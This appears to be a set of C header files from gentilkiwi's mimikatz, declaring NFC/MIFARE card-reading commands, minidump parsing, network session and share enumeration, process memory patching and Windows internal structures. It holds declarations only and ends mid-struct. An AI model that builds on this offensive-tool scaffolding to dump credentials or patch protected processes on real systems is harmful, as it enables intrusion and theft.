#define MIFARE_CLASSIC_CMD_REQUEST					0x26	// 7b, ISO/IEC 1443 -> REQA
#define MIFARE_CLASSIC_CMD_WAKEUP					0x52	// 7b, ISO/IEC 1443 -> WUPA
#define MIFARE_CLASSIC_CMD_ANTICOL_CL1				0x93, 0x20
#define MIFARE_CLASSIC_CMD_SELECT_CL1				0x93, 0x70
#define MIFARE_CLASSIC_CMD_ANTICOL_CL2				0x95, 0x20
#define MIFARE_CLASSIC_CMD_SELECT_CL2				0x95, 0x70
#define MIFARE_CLASSIC_CMD_HALT						0x50, 0x00
#define MIFARE_CLASSIC_CMD_AUTH_KEY_A				0x60
#define MIFARE_CLASSIC_CMD_AUTH_KEY_B				0x61
#define MIFARE_CLASSIC_CMD_PERSONALIZE_UID_USAGE	0x40
#define MIFARE_CLASSIC_CMD_SET_MOD_TYPE				0x43
#define MIFARE_CLASSIC_CMD_READ						0x30
#define MIFARE_CLASSIC_CMD_WRITE					0xa0
#define MIFARE_CLASSIC_CMD_DECREMENT				0xc0
#define MIFARE_CLASSIC_CMD_INCREMENT				0xc1
#define MIFARE_CLASSIC_CMD_RESTORE					0xc2
#define MIFARE_CLASSIC_CMD_TRANSFER					0xb0

#define MIFARE_ULTRALIGHT_WRITE_4B					0xa2

typedef struct _MIFARE_CLASSIC_ACCESS_BITS {
	unsigned not_c1_0: 1;
	unsigned not_c1_1: 1;
	unsigned not_c1_2: 1;
	unsigned not_c1_3: 1;
	unsigned not_c2_0: 1;
	unsigned not_c2_1: 1;
	unsigned not_c2_2: 1;
	unsigned not_c2_3: 1;
	unsigned not_c3_0: 1;
	unsigned not_c3_1: 1;
	unsigned not_c3_2: 1;
	unsigned not_c3_3: 1;
	unsigned c1_0: 1;
	unsigned c1_1: 1;
	unsigned c1_2: 1;
	unsigned c1_3: 1;
	unsigned c2_0: 1;
	unsigned c2_1: 1;
	unsigned c2_2: 1;
	unsigned c2_3: 1;
	unsigned c3_0: 1;
	unsigned c3_1: 1;
	unsigned c3_2: 1;
	unsigned c3_3: 1;

	unsigned data: 8;
} MIFARE_CLASSIC_ACCESS_BITS, *PMIFARE_CLASSIC_ACCESS_BITS;


typedef struct _MIFARE_CLASSIC_RAW_BLOCK {
	BYTE data[MIFARE_CLASSIC_BLOCK_SIZE];
} MIFARE_CLASSIC_RAW_BLOCK, *PMIFARE_CLASSIC_RAW_BLOCK;

typedef struct _MIFARE_CLASSIC_RAW_SECTOR {
	MIFARE_CLASSIC_RAW_BLOCK blocks[MIFARE_CLASSIC_BLOCKS_PER_SECTOR];
} MIFARE_CLASSIC_RAW_SECTOR, *PMIFARE_CLASSIC_RAW_SECTOR;

typedef struct _MIFARE_CLASSIC_RAW_CARD {
	MIFARE_CLASSIC_RAW_SECTOR sectors[MIFARE_CLASSIC_SECTORS];
} MIFARE_CLASSIC_RAW_CARD, *PMIFARE_CLASSIC_RAW_CARD;

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"




BOOL kull_m_minidump_open(IN HANDLE hFile, OUT PKULL_M_MINIDUMP_HANDLE *hMinidump);
BOOL kull_m_minidump_close(IN PKULL_M_MINIDUMP_HANDLE hMinidump);
BOOL kull_m_minidump_copy(IN PKULL_M_MINIDUMP_HANDLE hMinidump, OUT VOID *Destination, IN VOID *Source, IN SIZE_T Length);

LPVOID kull_m_minidump_RVAtoPTR(IN PKULL_M_MINIDUMP_HANDLE hMinidump, RVA64 rva);
LPVOID kull_m_minidump_stream(IN PKULL_M_MINIDUMP_HANDLE hMinidump, MINIDUMP_STREAM_TYPE type, OUT OPTIONAL DWORD *pSize);
LPVOID kull_m_minidump_remapVirtualMemory64(IN PKULL_M_MINIDUMP_HANDLE hMinidump, IN VOID *Source, IN SIZE_T Length);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"


extern DWORD WINAPI NetApiBufferFree (IN LPVOID Buffer);

BOOL kull_m_net_getCurrentDomainInfo(PPOLICY_DNS_DOMAIN_INFO * pDomainInfo);
BOOL kull_m_net_CreateWellKnownSid(WELL_KNOWN_SID_TYPE WellKnownSidType, PSID DomainSid, PSID * pSid);
BOOL kull_m_net_getDC(LPCWSTR fullDomainName, DWORD altFlags, LPWSTR * fullDCName);
BOOL kull_m_net_getComputerName(BOOL isFull, LPWSTR *name);

#define NET_API_STATUS          DWORD
#define NET_API_FUNCTION    __stdcall
#define LMSTR   LPWSTR
#define MAX_PREFERRED_LENGTH    ((DWORD) -1)

#define NERR_Success 0 

typedef struct _TIME_OF_DAY_INFO {
	DWORD tod_elapsedt;
	DWORD tod_msecs;
	DWORD tod_hours;
	DWORD tod_mins;
	DWORD tod_secs;
	DWORD tod_hunds;
	LONG  tod_timezone;
	DWORD tod_tinterval;
	DWORD tod_day;
	DWORD tod_month;
	DWORD tod_year;
	DWORD tod_weekday;
} TIME_OF_DAY_INFO, *PTIME_OF_DAY_INFO, *LPTIME_OF_DAY_INFO;

typedef struct _SESSION_INFO_10 {
	LMSTR sesi10_cname;
	LMSTR sesi10_username;
	DWORD sesi10_time;
	DWORD sesi10_idle_time;
} SESSION_INFO_10, *PSESSION_INFO_10, *LPSESSION_INFO_10;

typedef struct _WKSTA_USER_INFO_1 {
	LMSTR wkui1_username;
	LMSTR wkui1_logon_domain;
	LMSTR wkui1_oth_domains;
	LMSTR wkui1_logon_server;
}WKSTA_USER_INFO_1, *PWKSTA_USER_INFO_1, *LPWKSTA_USER_INFO_1;

#define SERVICE_WORKSTATION       TEXT("LanmanWorkstation")
#define SERVICE_SERVER            TEXT("LanmanServer")

typedef struct _STAT_WORKSTATION_0 {
	LARGE_INTEGER StatisticsStartTime;
	LARGE_INTEGER BytesReceived;
	LARGE_INTEGER SmbsReceived;
	LARGE_INTEGER PagingReadBytesRequested;
	LARGE_INTEGER NonPagingReadBytesRequested;
	LARGE_INTEGER CacheReadBytesRequested;
	LARGE_INTEGER NetworkReadBytesRequested;
	LARGE_INTEGER BytesTransmitted;
	LARGE_INTEGER SmbsTransmitted;
	LARGE_INTEGER PagingWriteBytesRequested;
	LARGE_INTEGER NonPagingWriteBytesRequested;
	LARGE_INTEGER CacheWriteBytesRequested;
	LARGE_INTEGER NetworkWriteBytesRequested;
	DWORD         InitiallyFailedOperations;
	DWORD         FailedCompletionOperations;
	DWORD         ReadOperations;
	DWORD         RandomReadOperations;
	DWORD         ReadSmbs;
	DWORD         LargeReadSmbs;
	DWORD         SmallReadSmbs;
	DWORD         WriteOperations;
	DWORD         RandomWriteOperations;
	DWORD         WriteSmbs;
	DWORD         LargeWriteSmbs;
	DWORD         SmallWriteSmbs;
	DWORD         RawReadsDenied;
	DWORD         RawWritesDenied;
	DWORD         NetworkErrors;
	DWORD         Sessions;
	DWORD         FailedSessions;
	DWORD         Reconnects;
	DWORD         CoreConnects;
	DWORD         Lanman20Connects;
	DWORD         Lanman21Connects;
	DWORD         LanmanNtConnects;
	DWORD         ServerDisconnects;
	DWORD         HungSessions;
	DWORD         UseCount;
	DWORD         FailedUseCount;
	DWORD         CurrentCommands;
} STAT_WORKSTATION_0, *PSTAT_WORKSTATION_0, *LPSTAT_WORKSTATION_0;

typedef struct _STAT_SERVER_0 {
	DWORD sts0_start;
	DWORD sts0_fopens;
	DWORD sts0_devopens;
	DWORD sts0_jobsqueued;
	DWORD sts0_sopens;
	DWORD sts0_stimedout;
	DWORD sts0_serrorout;
	DWORD sts0_pwerrors;
	DWORD sts0_permerrors;
	DWORD sts0_syserrors;
	DWORD sts0_bytessent_low;
	DWORD sts0_bytessent_high;
	DWORD sts0_bytesrcvd_low;
	DWORD sts0_bytesrcvd_high;
	DWORD sts0_avresponse;
	DWORD sts0_reqbufneed;
	DWORD sts0_bigbufneed;
} STAT_SERVER_0, *PSTAT_SERVER_0, *LPSTAT_SERVER_0;

#define STYPE_DISKTREE          0
#define STYPE_PRINTQ            1
#define STYPE_DEVICE            2
#define STYPE_IPC               3

#define STYPE_MASK              0x000000FF              // AND with shi_type to

#define STYPE_RESERVED1         0x01000000              // Reserved for internal processing
#define STYPE_RESERVED2         0x02000000            
#define STYPE_RESERVED3         0x04000000
#define STYPE_RESERVED4         0x08000000
#define STYPE_RESERVED_ALL      0x3FFFFF00

#define STYPE_TEMPORARY         0x40000000
#define STYPE_SPECIAL           0x80000000

typedef struct _SHARE_INFO_502 {
	LMSTR     shi502_netname;
	DWORD     shi502_type;
	LMSTR     shi502_remark;
	DWORD     shi502_permissions;
	DWORD     shi502_max_uses;
	DWORD     shi502_current_uses;
	LMSTR     shi502_path;
	LMSTR     shi502_passwd;
	DWORD     shi502_reserved;
	PSECURITY_DESCRIPTOR  shi502_security_descriptor;
} SHARE_INFO_502, *PSHARE_INFO_502, *LPSHARE_INFO_502;

typedef struct _SERVER_INFO_102 {
	DWORD          sv102_platform_id;
	LMSTR          sv102_name;
	DWORD          sv102_version_major;
	DWORD          sv102_version_minor;
	DWORD          sv102_type;
	LMSTR          sv102_comment;
	DWORD          sv102_users;
	LONG           sv102_disc;
	BOOL           sv102_hidden;
	DWORD          sv102_announce;
	DWORD          sv102_anndelta;
	DWORD          sv102_licenses;
	LMSTR          sv102_userpath;
} SERVER_INFO_102, *PSERVER_INFO_102, *LPSERVER_INFO_102;

typedef struct _SHARE_INFO_2 {
	LMSTR shi2_netname;
	DWORD shi2_type;
	LMSTR shi2_remark;
	DWORD shi2_permissions;
	DWORD shi2_max_uses;
	DWORD shi2_current_uses;
	LMSTR shi2_path;
	LMSTR shi2_passwd;
} SHARE_INFO_2, *PSHARE_INFO_2, *LPSHARE_INFO_2;

#define SV_TYPE_WORKSTATION         0x00000001
#define SV_TYPE_SERVER              0x00000002
#define SV_TYPE_SQLSERVER           0x00000004
#define SV_TYPE_DOMAIN_CTRL         0x00000008
#define SV_TYPE_DOMAIN_BAKCTRL      0x00000010
#define SV_TYPE_TIME_SOURCE         0x00000020
#define SV_TYPE_AFP                 0x00000040
#define SV_TYPE_NOVELL              0x00000080
#define SV_TYPE_DOMAIN_MEMBER       0x00000100
#define SV_TYPE_PRINTQ_SERVER       0x00000200
#define SV_TYPE_DIALIN_SERVER       0x00000400
#define SV_TYPE_XENIX_SERVER        0x00000800
#define SV_TYPE_SERVER_UNIX         SV_TYPE_XENIX_SERVER
#define SV_TYPE_NT                  0x00001000
#define SV_TYPE_WFW                 0x00002000
#define SV_TYPE_SERVER_MFPN         0x00004000
#define SV_TYPE_SERVER_NT           0x00008000
#define SV_TYPE_POTENTIAL_BROWSER   0x00010000
#define SV_TYPE_BACKUP_BROWSER      0x00020000
#define SV_TYPE_MASTER_BROWSER      0x00040000
#define SV_TYPE_DOMAIN_MASTER       0x00080000
#define SV_TYPE_SERVER_OSF          0x00100000
#define SV_TYPE_SERVER_VMS          0x00200000
#define SV_TYPE_WINDOWS             0x00400000  /* Windows95 and above */
#define SV_TYPE_DFS                 0x00800000  /* Root of a DFS tree */
#define SV_TYPE_CLUSTER_NT          0x01000000  /* NT Cluster */
#define SV_TYPE_TERMINALSERVER      0x02000000  /* Terminal Server(Hydra) */
#define SV_TYPE_CLUSTER_VS_NT       0x04000000  /* NT Cluster Virtual Server Name */
#define SV_TYPE_DCE                 0x10000000  /* IBM DSS (Directory and Security Services) or equivalent */
#define SV_TYPE_ALTERNATE_XPORT     0x20000000  /* return list for alternate transport */
#define SV_TYPE_LOCAL_LIST_ONLY     0x40000000  /* Return local list only */
#define SV_TYPE_DOMAIN_ENUM         0x80000000
#define SV_TYPE_ALL                 0xFFFFFFFF  /* handy for NetServerEnum2 */

NET_API_STATUS NET_API_FUNCTION NetSessionEnum(IN LMSTR servername, IN LMSTR UncClientName, IN LMSTR username, IN DWORD level, OUT LPBYTE *bufptr, IN DWORD prefmaxlen, OUT LPDWORD entriesread, OUT LPDWORD totalentries, IN OUT LPDWORD resume_handle);
NET_API_STATUS NET_API_FUNCTION NetWkstaUserEnum(IN LMSTR servername, IN DWORD level, OUT LPBYTE *bufptr, IN DWORD prefmaxlen, OUT LPDWORD entriesread, OUT LPDWORD totalentries, IN OUT LPDWORD resumehandle);
NET_API_STATUS NET_API_FUNCTION NetShareEnum(IN LMSTR servername, IN DWORD level, OUT LPBYTE *bufptr, IN DWORD prefmaxlen, OUT LPDWORD entriesread, OUT LPDWORD totalentries, IN OUT LPDWORD resume_handle);
NET_API_STATUS NET_API_FUNCTION NetStatisticsGet(IN LPWSTR server, IN LPWSTR service, IN DWORD  level, IN DWORD  options, OUT LPBYTE *bufptr);
NET_API_STATUS NET_API_FUNCTION NetRemoteTOD(IN LPCWSTR UncServerName, OUT PTIME_OF_DAY_INFO *pToD);
NET_API_STATUS NET_API_FUNCTION NetServerGetInfo(IN LPWSTR servername, IN DWORD level, OUT LPBYTE *bufptr);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"


FILE * logfile;
#if !defined(MIMIKATZ_W2000_SUPPORT)
wchar_t * outputBuffer;
size_t outputBufferElements, outputBufferElementsPosition;
#endif

void kprintf(PCWCHAR format, ...);
void kprintf_inputline(PCWCHAR format, ...);

BOOL kull_m_output_file(PCWCHAR file);

void kull_m_output_init();
void kull_m_output_clean();

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "kull_m_memory.h"
//#include "kull_m_service.h"
//#include "kull_m_process.h"





typedef struct _KULL_M_PATCH_MULTIPLE {
	KULL_M_PATCH_PATTERN Search;
	KULL_M_PATCH_PATTERN Patch;
	LONG Offset;
	KULL_M_MEMORY_ADDRESS AdressOfPatch;
	DWORD OldProtect;
	KULL_M_MEMORY_ADDRESS LocalBackup;
} KULL_M_PATCH_MULTIPLE, *PKULL_M_PATCH_MULTIPLE;

BOOL kull_m_patch(PKULL_M_MEMORY_SEARCH sMemory, PKULL_M_MEMORY_ADDRESS pPattern, SIZE_T szPattern, PKULL_M_MEMORY_ADDRESS pPatch, SIZE_T szPatch, LONG offsetOfPatch, PKULL_M_PATCH_CALLBACK pCallBackBeforeRestore, int argc, wchar_t * args[], NTSTATUS * pRetCallBack);
PKULL_M_PATCH_GENERIC kull_m_patch_getGenericFromBuild(PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, DWORD BuildNumber);
BOOL kull_m_patch_genericProcessOrServiceFromBuild(PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, PCWSTR processOrService, PCWSTR moduleName, BOOL isService);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"

BOOL kull_m_pipe_server(LPCWCHAR pipeName, HANDLE *phPipe);
BOOL kull_m_pipe_server_connect(HANDLE hPipe);
BOOL kull_m_pipe_client(LPCWCHAR pipeName, PHANDLE phPipe);
BOOL kull_m_pipe_read(HANDLE hPipe, LPBYTE *buffer, DWORD *size);
BOOL kull_m_pipe_write(HANDLE hPipe, LPCVOID buffer, DWORD size);
BOOL kull_m_pipe_close(PHANDLE phPipe);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"
//#include "kull_m_mifare.h"
//#include "kull_m_string.h"

#define PN532_MAX_LEN					265

#define PN532_Host_PN532				0xd4
#define PN532_PN532_Host				0xd5

// Miscellaneous
#define PN532_CMD_Diagnose				0x00 // it
#define PN532_CMD_GetFirmwareVersion	0x02 // it
#define PN532_CMD_GetGeneralStatus		0x04 // it
#define PN532_CMD_ReadRegister			0x06 // it
#define PN532_CMD_WriteRegister			0x08 // it
#define PN532_CMD_ReadGPIO				0x0c // it
#define PN532_CMD_WriteGPIO				0x0e // it
#define PN532_CMD_SetSerialBaudRate		0x10 // it
#define PN532_CMD_SetParameters			0x12 // it
#define PN532_CMD_SAMConfiguration		0x14 // it
#define PN532_CMD_PowerDown				0x16 // it

// RF communication
#define PN532_CMD_RFConfiguration		0x32 // it
#define PN532_CMD_RFRegulationTest		0x58 // it

// Initiator
#define PN532_CMD_InJumpForDEP			0x56 // i
#define PN532_CMD_InJumpForPSL			0x46 // i
#define PN532_CMD_InListPassiveTarget	0x4a // i
#define PN532_CMD_InATR					0x50 // i
#define PN532_CMD_InPSL					0x4e // i
#define PN532_CMD_InDataExchange		0x40 // i
#define PN532_CMD_InCommunicateThru		0x42 // i
#define PN532_CMD_InDeselect			0x44 // i
#define PN532_CMD_InRelease				0x52 // i
#define PN532_CMD_InSelect				0x54 // i
#define PN532_CMD_InAutoPoll			0x60 // i

// Target
#define PN532_CMD_TgInitAsTarget		0x8c // t
#define PN532_CMD_TgSetGeneralBytes		0x92 // t
#define PN532_CMD_TgGetData				0x86 // t
#define PN532_CMD_TgSetData				0x8e // t
#define PN532_CMD_TgSetMetaData			0x94 // t
#define PN532_CMD_TgGetInitiatorCommand	0x88 // t
#define PN532_CMD_TgResponseToInitiator	0x90 // t
#define PN532_CMD_TgGetTargetStatus		0x8a // t


#define PN532_CMD_Diagnose_CommunicationLineTest	0x00
#define PN532_CMD_Diagnose_RomTest					0x01
#define PN532_CMD_Diagnose_RamTest					0x02
#define PN532_CMD_Diagnose_PollingTestToTarget		0x04
#define PN532_CMD_Diagnose_EchoBackTest				0x05
#define PN532_CMD_Diagnose_AttentionRequestTest		0x06
#define PN532_CMD_Diagnose_SelfAntennaTest			0x07

typedef BOOL (CALLBACK * PKULL_M_PN532_COMM_CALLBACK) (const BYTE *pbData, const UINT16 cbData, BYTE *pbResult, UINT16 *cbResult, LPVOID suppdata);

typedef struct _PN532_TARGET_TYPE_A {
	BYTE Tg;
	UINT16 SENS_RES;
	BYTE SEL_RES;
	BYTE NFCIDLength;
	PBYTE NFCID1;
	BYTE ATSLength;
	PBYTE ATS;
} PN532_TARGET_TYPE_A, *PPN532_TARGET_TYPE_A;

typedef struct _PN532_TARGET {
	BYTE Tg;
	BYTE BrTy;
	union {
		PN532_TARGET_TYPE_A TypeA;
	} Target;
} PN532_TARGET, *PPN532_TARGET;

typedef struct _KULL_M_PN532_COMM {
	PKULL_M_PN532_COMM_CALLBACK communicator;
	LPVOID suppdata;
	BOOL descr;
} KULL_M_PN532_COMM, *PKULL_M_PN532_COMM;

#pragma pack(push, 1)
typedef struct _PN532_MIFARE_CMD {
	BYTE Cmd;
	BYTE Addr;
	BYTE Data[16];
} PN532_MIFARE_CMD, *PPN532_MIFARE_CMD;

typedef struct _PN532_DATA_EXCHANGE_MIFARE {
	BYTE Tg;
	PN532_MIFARE_CMD DataOut;
} PN532_DATA_EXCHANGE_MIFARE, *PPN532_DATA_EXCHANGE_MIFARE;
#pragma pack(pop)

void kull_m_pn532_init(PKULL_M_PN532_COMM_CALLBACK communicator, LPVOID suppdata, BOOL descr, PKULL_M_PN532_COMM comm);
BOOL kull_m_pn532_Diagnose(PKULL_M_PN532_COMM comm /*, ...*/);
BOOL kull_m_pn532_GetFirmware(PKULL_M_PN532_COMM comm, BYTE firmwareInfo[4]);
BOOL kull_m_pn532_GetGeneralStatus(PKULL_M_PN532_COMM comm /*, ...*/);

BOOL kull_m_pn532_InListPassiveTarget(PKULL_M_PN532_COMM comm, const BYTE MaxTg, const BYTE BrTy, const BYTE *pbInit, UINT16 cbInit, BYTE *NbTg, PPN532_TARGET *Targets);
BOOL kull_m_pn532_InRelease(PKULL_M_PN532_COMM comm, const BYTE Tg);

void kull_m_pn532_TgInitAsTarget(PKULL_M_PN532_COMM comm);
void kull_m_pn532_TgGetInitiatorCommand(PKULL_M_PN532_COMM comm);
void kull_m_pn532_TgResponseToInitiator(PKULL_M_PN532_COMM comm);
void kull_m_pn532_TgGetData(PKULL_M_PN532_COMM comm);

BOOL kull_m_pn532_Mifare_Classic_AuthBlock(PKULL_M_PN532_COMM comm, PPN532_TARGET_TYPE_A target, const BYTE authKey, const BYTE blockId, const BYTE key[MIFARE_CLASSIC_KEY_SIZE]);
BOOL kull_m_pn532_Mifare_Classic_ReadBlock(PKULL_M_PN532_COMM comm, PPN532_TARGET_TYPE_A target, const BYTE blockId, PMIFARE_CLASSIC_RAW_BLOCK block);
BOOL kull_m_pn532_Mifare_Classic_ReadSector(PKULL_M_PN532_COMM comm, PPN532_TARGET_TYPE_A target, const BYTE sectorId, PMIFARE_CLASSIC_RAW_SECTOR sector);
BOOL kull_m_pn532_Mifare_Classic_ReadSectorWithKey(PKULL_M_PN532_COMM comm, PPN532_TARGET_TYPE_A target, const BYTE sectorId, const BYTE authKey, const BYTE key[MIFARE_CLASSIC_KEY_SIZE], PMIFARE_CLASSIC_RAW_SECTOR sector);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"

//#include "kull_m_memory.h"
//#include "kull_m_string.h"

#if defined(_M_X64) || defined(_M_ARM64)
	#define	MmSystemRangeStart	((PBYTE) 0xffff080000000000)
#elif defined(_M_IX86)
	#define MmSystemRangeStart	((PBYTE) 0x80000000)
#endif

#if !defined(__MACHINE)
#define __MACHINE(X)	X;
#endif
#if !defined(__MACHINEX86)
#define __MACHINEX86	__MACHINE
#endif
__MACHINEX86(unsigned long __readfsdword(unsigned long))

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation,
	SystemProcessorInformation,
	SystemPerformanceInformation,
	SystemTimeOfDayInformation,
	SystemPathInformation,
	SystemProcessInformation,
	SystemCallCountInformation,
	SystemDeviceInformation,
	SystemProcessorPerformanceInformation,
	SystemFlagsInformation,
	SystemCallTimeInformation,
	SystemModuleInformation,
	SystemLocksInformation,
	SystemStackTraceInformation,
	SystemPagedPoolInformation,
	SystemNonPagedPoolInformation,
	SystemHandleInformation,
	SystemObjectInformation,
	SystemPageFileInformation,
	SystemVdmInstemulInformation,
	SystemVdmBopInformation,
	SystemFileCacheInformation,
	SystemPoolTagInformation,
	SystemInterruptInformation,
	SystemDpcBehaviorInformation,
	SystemFullMemoryInformation,
	SystemLoadGdiDriverInformation,
	SystemUnloadGdiDriverInformation,
	SystemTimeAdjustmentInformation,
	SystemSummaryMemoryInformation,
	SystemNextEventIdInformation,
	SystemEventIdsInformation,
	SystemCrashDumpInformation,
	SystemExceptionInformation,
	SystemCrashDumpStateInformation,
	SystemKernelDebuggerInformation,
	SystemContextSwitchInformation,
	SystemRegistryQuotaInformation,
	SystemExtendServiceTableInformation,
	SystemPrioritySeperation,
	SystemPlugPlayBusInformation,
	SystemDockInformation,
	KIWI_SystemPowerInformation,
	SystemProcessorSpeedInformation,
	SystemCurrentTimeZoneInformation,
	SystemLookasideInformation,
	KIWI_SystemMmSystemRangeStart = 50,
	SystemIsolatedUserModeInformation = 165
} SYSTEM_INFORMATION_CLASS, *PSYSTEM_INFORMATION_CLASS;

typedef enum _PROCESSINFOCLASS {
	ProcessBasicInformation,
	ProcessQuotaLimits,
	ProcessIoCounters,
	ProcessVmCounters,
	ProcessTimes,
	ProcessBasePriority,
	ProcessRaisePriority,
	ProcessDebugPort,
	ProcessExceptionPort,
	ProcessAccessToken,
	ProcessLdtInformation,
	ProcessLdtSize,
	ProcessDefaultHardErrorMode,
	ProcessIoPortHandlers,		  // Note: this is kernel mode only
	ProcessPooledUsageAndLimits,
	ProcessWorkingSetWatch,
	ProcessUserModeIOPL,
	ProcessEnableAlignmentFaultFixup,
	ProcessPriorityClass,
	ProcessWx86Information,
	ProcessHandleCount,
	ProcessAffinityMask,
	ProcessPriorityBoost,
	ProcessDeviceMap,
	ProcessSessionInformation,
	ProcessForegroundInformation,
	ProcessWow64Information,
	ProcessImageFileName,
	ProcessLUIDDeviceMapsEnabled,
	ProcessBreakOnTermination,
	ProcessDebugObjectHandle,
	ProcessDebugFlags,
	ProcessHandleTracing,
	ProcessIoPriority,
	ProcessExecuteFlags,
	ProcessTlsInformation,
	ProcessCookie,
	ProcessImageInformation,
	ProcessCycleTime,
	ProcessPagePriority,
	ProcessInstrumentationCallback,
	ProcessThreadStackAllocation,
	ProcessWorkingSetWatchEx,
	ProcessImageFileNameWin32,
	ProcessImageFileMapping,
	ProcessAffinityUpdateMode,
	ProcessMemoryAllocationMode,
	ProcessGroupInformation,
	ProcessTokenVirtualizationEnabled,
	ProcessConsoleHostProcess,
	ProcessWindowInformation,
	MaxProcessInfoClass			 // MaxProcessInfoClass should always be the last enum
} PROCESSINFOCLASS;




typedef VM_COUNTERS *PVM_COUNTERS;






typedef struct _SYSTEM_BASIC_INFORMATION {
    ULONG Reserved;
    ULONG TimerResolution;
    ULONG PageSize;
    ULONG NumberOfPhysicalPages;
    ULONG LowestPhysicalPageNumber;
    ULONG HighestPhysicalPageNumber;
    ULONG AllocationGranularity;
    ULONG MinimumUserModeAddress;
    ULONG MaximumUserModeAddress;
    ULONG ActiveProcessorsAffinityMask;
    UCHAR NumberOfProcessors;
} SYSTEM_BASIC_INFORMATION, *PSYSTEM_BASIC_INFORMATION;


typedef struct _LDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	/// ...
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
	ULONG Length; 
	BOOLEAN Initialized; 
	PVOID SsHandle; 
	LIST_ENTRY InLoadOrderModulevector; 
	LIST_ENTRY InMemoryOrderModulevector; 
	LIST_ENTRY InInitializationOrderModulevector;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _PEB {
	BOOLEAN InheritedAddressSpace; 
	BOOLEAN ReadImageFileExecOptions; 
	BOOLEAN BeingDebugged; 
	struct BitField {
		BYTE ImageUsesLargePages :1;
		BYTE SpareBits :7;
	};
	HANDLE Mutant; 
	PVOID ImageBaseAddress; 
	PPEB_LDR_DATA Ldr;
	/// ...
} PEB, *PPEB;

#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
typedef struct _LSA_UNICODE_STRING_F32 {
	USHORT Length;
	USHORT MaximumLength;
	DWORD  Buffer;
} LSA_UNICODE_STRING_F32, *PLSA_UNICODE_STRING_F32;

typedef LSA_UNICODE_STRING_F32 UNICODE_STRING_F32, *PUNICODE_STRING_F32;

typedef struct _LDR_DATA_TABLE_ENTRY_F32
{
	LIST_ENTRY32 InLoadOrderLinks;
	LIST_ENTRY32 InMemoryOrderLinks;
	LIST_ENTRY32 InInitializationOrderLinks;
	DWORD DllBase;
	DWORD EntryPoint;
	DWORD SizeOfImage;
	UNICODE_STRING_F32 FullDllName;
	UNICODE_STRING_F32 BaseDllName;
	/// ...
} LDR_DATA_TABLE_ENTRY_F32, *PLDR_DATA_TABLE_ENTRY_F32;

typedef struct _PEB_LDR_DATA_F32 {
	ULONG Length; 
	BOOLEAN Initialized; 
	DWORD SsHandle; 
	LIST_ENTRY32 InLoadOrderModulevector; 
	LIST_ENTRY32 InMemoryOrderModulevector; 
	LIST_ENTRY32 InInitializationOrderModulevector;
} PEB_LDR_DATA_F32, *PPEB_LDR_DATA_F32;

typedef struct _PEB_F32 {
	BOOLEAN InheritedAddressSpace; 
	BOOLEAN ReadImageFileExecOptions; 
	BOOLEAN BeingDebugged; 
	struct BitField_F32 {
		BYTE ImageUsesLargePages :1;
		BYTE SpareBits :7;
	};
	DWORD Mutant; 
	DWORD ImageBaseAddress; 
	DWORD Ldr;
	/// ...
} PEB_F32, *PPEB_F32;
#endif

typedef struct _KERNEL_USER_TIMES {
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER ExitTime;
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
} KERNEL_USER_TIMES, *PKERNEL_USER_TIMES;

typedef struct _PROCESS_BASIC_INFORMATION {
	NTSTATUS ExitStatus;
	PPEB PebBaseAddress;
	ULONG_PTR AffinityMask;
	KPRIORITY BasePriority;
	ULONG_PTR UniqueProcessId;
	ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION,*PPROCESS_BASIC_INFORMATION;

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
	ULONG NumberOfModules;
	RTL_PROCESS_MODULE_INFORMATION Modules[ANYSIZE_ARRAY];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

typedef struct _SYSTEM_ISOLATED_USER_MODE_INFORMATION {
	BOOLEAN SecureKernelRunning : 1;
	BOOLEAN HvciEnabled : 1;
	BOOLEAN HvciStrictMode : 1;
	BOOLEAN DebugEnabled : 1;
	BOOLEAN FirmwarePageProtection : 1;
	BOOLEAN SpareFlags : 1;
	BOOLEAN TrustletRunning : 1;
	BOOLEAN SpareFlags2 : 1;
